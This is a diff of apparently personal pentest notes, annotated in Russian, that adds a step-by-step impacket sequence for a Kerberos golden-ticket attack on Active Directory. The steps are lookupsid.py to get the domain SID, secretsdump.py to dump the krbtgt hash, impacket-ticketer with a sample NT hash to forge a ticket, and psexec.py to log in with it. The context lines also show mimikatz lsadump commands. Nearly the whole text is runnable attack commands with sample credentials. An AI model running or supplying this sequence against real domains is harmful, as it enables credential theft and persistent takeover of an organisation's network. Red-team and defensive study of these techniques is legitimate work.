@@ -67,7 +67,20 @@ mimikatz # token::elevate (DONT NEED THIS)
 mimikatz # lsadump::lsa /patch (lsadump::lsa /inject /name:krbtgt) ---нужен sid и хеш krbtgt
 
 # Create golden ticket (write to file in this case)
-Golden ticket impacket
+
+# Golden ticket impacket
+
+python lookupsid.py ignite/Administrator:Ignite@987@192.168.1.105   (Получение SID домена)
+
+python secretsdump.py administrator:Ignite@987@192.168.1.105 -выходной файл krb -user-status (Получение хеша krbtg)
+
+impacket-ticketer -nthash 08f5bf2e292d77d8e460d3926a0d90de -domain-sid S-1-5-21-719111203-942671344-1831409528 -domain domain.dom anyuser   (В текущей директории создан билет anyuser.ccache. Экспортируем его)
+
+export KRB5CCNAME=anyuser.ccache
+
+python3 psexec.py -k -no-pass [домен]/[пользователь]@[имя хоста]    (подключение с псезек)
+
+
 
 https://xakep.ru/2020/04/15/windows-ad-persistence/
 
